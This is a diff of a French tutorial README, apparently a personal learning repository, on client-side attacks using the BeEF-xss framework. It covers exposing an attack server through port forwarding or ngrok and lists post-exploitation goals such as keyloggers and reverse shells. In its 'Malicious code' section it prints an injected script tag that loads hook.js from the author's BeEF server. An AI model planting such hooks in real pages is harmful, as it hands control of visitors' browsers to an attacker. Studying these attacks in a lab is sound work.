@@ -335,7 +335,7 @@ BeEF-xss est un framework d'exploitation Web codé en PHP & JavaScript, se conce
 
 
 
-## Lancer un serveur de communication (local, port forwarding, ngrok)
+## 1. Lancer un serveur de communication (local, port forwarding, ngrok)
 
 Quand on parle de serveur, on parle du hardware. Mais y a un certains nombre de programmes qui tournent sur le serveur qu'on appelle aussi serveurs, car ils répondent à des requetes.
 - serveur HTTP : logiciel qui prend en charge les requettes client/serveur du protocole HTTP, ex : Apache, 2is, Nginx
@@ -350,7 +350,7 @@ Quand on parle de serveur, on parle du hardware. Mais y a un certains nombre de 
 ![Capture d’écran 2023-08-03 à 18 30 54](https://github.com/iciamyplant/client_side_attack/assets/57531966/351c38cc-3bf5-4f8c-ab66-d700fbe08e6e)
 
 
-#### A. En local pour avoir le server on en local + le hook.js
+#### a. En local pour avoir le server on en local + le hook.js
 
 [Tutoriel](https://www.youtube.com/watch?v=V26rdXUFQAY)
 `````
@@ -392,7 +392,7 @@ sudo beef-xss-stop
 ````
 Ok, on a accès à notre page web hébergée sur notre serveur Apache sur la VM à partir de mon téléphone + du MAC sur le reseau local. On a réussi sur l'index.html de Apache de mettre le hook.js, et on arrive à envoyer des commandes sur mon tel et mac. Mais là on peut accéder à index.hmtl à partir des machines de mon réseau, mais il sera pas accessible à partir de l'internet. Maintenant on va essayer de hook un navigateur d'une machine qui n'est pas sur mon réseau local. Une solution est de prendre un hébergement et j'y envoyoie mes fichiers : sauf qui si on taff sur wordpress va falloir synchroniser la bdd etc. 2 autres solutions : port forwarding et ngrok
 
-#### B. Port forwarding ou Ngrok
+#### b. Port forwarding ou Ngrok
 
 Port = chiffre ajouté en suffixe d'une adresse ip qui permet de savoir quelle application on veut contacter sur la machine. [Cours](https://www.youtube.com/watch?v=UyIcIl3B9ZU)
 
@@ -437,9 +437,9 @@ service apache2 restart
 [installer un serveur web à la maison](https://www.magentix.fr/blog/un-serveur-web-a-la-maison.html)
 J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto Ngrok de Grafikart](https://www.youtube.com/watch?v=PylWF44i2pY) Ngrok = outil qui permet de créer un tunnel vers votre environnement de développement en local. Ngrok va venir créer un tunnel. On ouvre ngrok, on dit ok je veux me connecter à toi. Là on ouvre un tunnel, comme un vpn, entre notre ordinateur et le serveur de ngrok, qui lui va nous créer un url sur le serveur de ngrok, que les utilisateurs vont pouvoir, eux, accéder directement au serveur qui est sur notre ordinateur. 
 
-## Exploitation
+## 2. Exploitation
 
-### A. Malicious code
+### a. Malicious code
 
 ````
 <script src="http://<IP de mon serveur>:3000/hook.js"></script>
@@ -454,7 +454,7 @@ J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto
 ````
 
 
-#### B. UI Panel : Details & Commands
+#### b. UI Panel : Details & Commands
 
 |Details|A quoi ca correspond|
 |----|----|
@@ -500,7 +500,7 @@ J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto
 
 
 
-#### C. Persistance 
+#### c. Persistance 
 
 
 --> Quel est l'objectif ? Que veut-on faire sur l'ordinateur de la victime ?
@@ -552,6 +552,24 @@ automatic rule angine in beef to run automaticly modules [automatic rules](https
 
 
 
+
+
+# III - MiTM ARP Poisoning
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------------
+
 # III - En pratique
 
 ### a. identifier la victime
@@ -579,8 +597,6 @@ automatic rule angine in beef to run automaticly modules [automatic rules](https
 - install a keylogger
 - reverse shell ? Jsshell
 - ....
-
-Les navigateurs sont en fait un ensemble de logiciels : le navigateur lui-même, plus des logiciels tiers tels qu'Adobe Acrobat Reader, Adobe Flash, iTunes, QuickTime, RealPlayer, etc. Tous sont potentiellement vulnérables aux attaques côté client. 
 
 [vidéo explication](https://www.youtube.com/watch?v=TVBMqQGLCYM)
 
